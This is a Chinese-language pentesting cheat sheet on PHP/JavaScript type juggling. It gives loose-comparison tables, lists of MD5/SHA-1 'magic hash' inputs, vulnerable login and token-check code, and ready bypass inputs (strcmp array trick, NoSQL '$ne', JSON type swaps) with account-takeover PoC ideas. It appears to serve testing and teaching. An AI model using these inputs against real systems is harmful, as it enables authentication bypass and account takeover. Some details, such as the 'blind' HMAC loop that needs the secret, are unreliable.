# 类型混淆 (Type Juggling / Loose Comparison)

> **定位**: 主要影响 PHP / JavaScript 弱类型语言, 核心利用松散比较(`==`)的非对称性。
> **CWE**: CWE-697 (Incorrect Comparison) | **OWASP**: A07:2021 认证失败
> **回报**: 认证绕过通常高危, CTF 高频, 赏金 $500-$3000

---

## 0. 核心原理

PHP `==` / JavaScript `==` 的 "弱比较" 会做类型转换:
```
"0e123" == "0" // true (PHP 会把 0e 开头当科学计数法 = 0)
"abc" == 0     // true (PHP 5.x / 某些场景)
[1] == "1"     // true (JS)
null == false  // true
```

这让攻击者可以用 "看起来完全不同的值" 通过 "等于检查"。

---

## 1. PHP 弱比较速查表

```php
// 神奇对比 (PHP 7.x/8.0)
var_dump("0e123" == "0e456");        // true  (都是 0 的科学记数)
var_dump("abc" == 0);                 // false(PHP 8) / true(PHP 5.x)
var_dump("1abc" == 1);                // false(PHP 8) / true(PHP 5.x)
var_dump(null == false);              // true
var_dump(null == 0);                  // true
var_dump(false == 0);                 // true
var_dump(true == "abc");              // true
var_dump(true == 1);                  // true
var_dump([] == false);                // true
var_dump("" == null);                 // true
```

**PHP 8 修复了字符串与数字的弱比较**, 但是 `"0e123"` 形式的科学计数**仍然**。

---

## 2. 0e 哈希家族 (MD5 magic hash)

### 2.1 为什么有效

PHP 比较两个字符串时, 若都符合 `/^0e[0-9]+$/`, 会被转为浮点数 0, `0 == 0` 返回 true。

### 2.2 已知碰撞字典

#### MD5 == `0e...`
```
QNKCDZO                         0e830400451993494058024219903391
240610708                       0e462097431906509019562988736854
s878926199a                     0e545993274517709034328855841020
s155964671a                     0e342768416822451524974117254469
s214587387a                     0e848240448830537924465865611904
s214587387a                     (同上)
s1091221200a                    0e940624217856561557816327384675
s1184209335a                    0e072485820392773389523109082030
s1665632922a                    0e731198061491163073197128363787
s1502113478a                    0e861580163291561247404381396064
s1885207154a                    0e509367213418206700842008763514
s1836677006a                    0e481036490867661113260034900752
```

#### SHA-1 == `0e...`
```
aaroZmOk                        0e66507019969427134894567494305185566735
aaK1STfY                        0e76658526655756207688271159624026011393
aaO8zKZF                        0e89257456677279068558073954252716165668
aa3OFF9m                        0e36977786278517984959260394024281014729
```

#### MD5 == `0e...`(更多)
```
CbDLytmyGm2xQyaLNhWn   → 0e...   
770hQgrhoz4U9yU8uInV   → 0e...
```

### 2.3 利用场景

```php
// 典型漏洞代码
if ($_GET['token'] == md5($secret . $_GET['user'])) {
    // 鉴权通过
}

// 攻击: 
// 如果能让 md5() 的返回落入 0e... 家族
// token 也传 0e 开头的已知哈希
// ?token=0e830400451993494058024219903391&user=XXX
```

### 2.4 HMAC 0e 爆破

某些场景可批量爆破让 HMAC 输出也成 `0e...`:
```python
import hmac, hashlib, itertools, string

secret = b"unknown"  # 盲爆
for i in range(10000):
    msg = f"test{i}".encode()
    h = hmac.new(secret, msg, hashlib.md5).hexdigest()
    if h.startswith("0e") and h[2:].isdigit():
        print(f"Found: msg={msg}, hash={h}")
```

---

## 3. JSON / JavaScript 类型混淆

### 3.1 JSON 类型注入

期望字符串 → 传其他类型, 后端可能意外通过检查:

```json
// 场景: 鉴权检查 password == userInputPassword
{"password": null}                    // 若后端 user.password 也是 null
{"password": true}                    // 若 user.password 字段被解析成 true
{"password": ["anything"]}            // 数组对比
{"password": {"$ne": null}}           // NoSQL 特有
```

### 3.2 JavaScript `==` 漏洞

```javascript
"" == 0              // true
"0" == 0             // true
[] == 0              // true (空数组转为 0)
[] == false          // true
[[]] == false        // true
[0] == false         // true

// 利用场景: Node.js 应用
if (token == userToken) { ... }
// 如果 token 来自数据库为 0, 用户输入 "" 也通过
```

### 3.3 NaN 陷阱

```javascript
NaN == NaN  // false!
// 某些 check 用 == 判等, NaN 永远比不过
// 如果 token = parseInt("abc") = NaN, 永远不过 -> 反而变安全
// 但若是 if (token != userInput) 则 NaN != anything 永远 true -> 可绕过
```

---

## 4. 实战漏洞场景

### 4.1 登录绕过 (PHP)

```php
// 漏洞代码
$password = $_POST['password'];
$hash = md5($password);
if ($hash == $stored_hash) { login(); }
```

若 `$stored_hash` 是 `0e123456...`, 任何 md5 结果为 `0e...` 的密码(如 `240610708`)都能登录。

### 4.2 API Token 校验 (Node.js)

```javascript
if (req.query.token == user.apiKey) {
    // 鉴权通过
}
```

若 `apiKey` 是 `0`, 传 `?token=` (空字符串) 也通过(`"" == 0` = true)。

### 4.3 PHP strcmp 漏洞

```php
if (strcmp($_POST['password'], $real_password) == 0) {
    // PHP 5.x: strcmp 遇到数组返回 NULL, NULL == 0 → true
}
// 利用: POST password[]=anything
```

### 4.4 json_decode 弱比较

```php
$data = json_decode($_POST['data'], true);
if ($data['role'] == "admin") { ... }

// 攻击:
// {"role": true}  → true == "admin" 在 PHP 5.x 是 true
// {"role": 1}     → 同上
```

---

## 5. Testing Checklist

- [ ] 登录 / Token 校验处, 传 `password[]=1` 测 strcmp 漏洞
- [ ] 传 `password=0e123456` 测 MD5 0e 家族
- [ ] 传 `password=0` / `password=null` / `password=true` 测弱比较
- [ ] JSON Body 改字段类型: string→array / string→null / string→bool
- [ ] NoSQL: `{"$ne":null}` / `{"$gt":""}` / `{"$regex":"^a"}`
- [ ] JavaScript `==` 比较: `""` / `0` / `[]` / `false`
- [ ] 看源码/JS文件, 搜 `==` 而非 `===`
- [ ] 测试 hashing 函数: 能否控制输入让 hash 落入 0e 家族

---

## 6. 高频漏洞模式快查

| 代码模式(PHP) | 攻击 |
|--------------|------|
| `if (md5($a) == md5($b))` | 0e 哈希碰撞 |
| `if (strcmp($a, $b) == 0)` | 传数组 `a[]=1` |
| `if (ereg("^[a-z]+$", $a))` | 传 `admin%00whatever` 截断(PHP 5.x) |
| `if (preg_match("/^\d+$/", $a))` | 换行绕过 `1\n任意` |
| `if (is_numeric($a))` | 传 `0x123` / `1e10` |
| `if (in_array($a, $arr))` | 弱比较模式下 `$a=true` 可能匹配任意非空字符串 |

| 代码模式(JS) | 攻击 |
|-------------|------|
| `if (a == b)` | 跨类型 |
| `if (!a)` | 空字符串 / 0 / null / undefined 都 falsy |
| `JSON.parse(input).role == "admin"` | 传 `{"role":true}` |

---

## 7. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| PHP 8 不再 `"abc" == 0` | 0e 家族仍有效 |
| 后端用 `===` 严格比较 | 不受影响 |
| 使用 `hash_equals()` | PHP 专门防止时序攻击, 类型严格 |
| 使用 `bcrypt`/`password_verify` | 不受影响 |
| 框架自动强类型 (TypeScript / Go) | 通常安全, 但 JSON unmarshal 仍有可能 |

---

## 8. 影响证明

**低等级 PoC**: 传非预期类型通过检查。

**高等级 PoC**:
1. 0e 哈希登录管理员账号 → 截图管理后台
2. strcmp 数组绕过 → 提取管理员 Token → 接管账号
3. NoSQL `$ne` 绕过 → 登录任意用户

---

## 9. 相关参考

| 内容 | 文件 |
|------|------|
| SQL 注入认证绕过 | [sqli.md](sqli.md) §认证绕过 |
| NoSQL 注入(独立方向) | [sqli.md](sqli.md) §NoSQL |
| 原型污染 | [prototype-pollution.md](prototype-pollution.md) |
| JWT 攻击(算法混淆本质也是一种类型混淆) | [../api-security.md](../api-security.md) §JWT攻击 |

---

**CWE**: CWE-697 | **CVSS 典型**: 8.1 (认证绕过) / 5.3 (逻辑绕过)
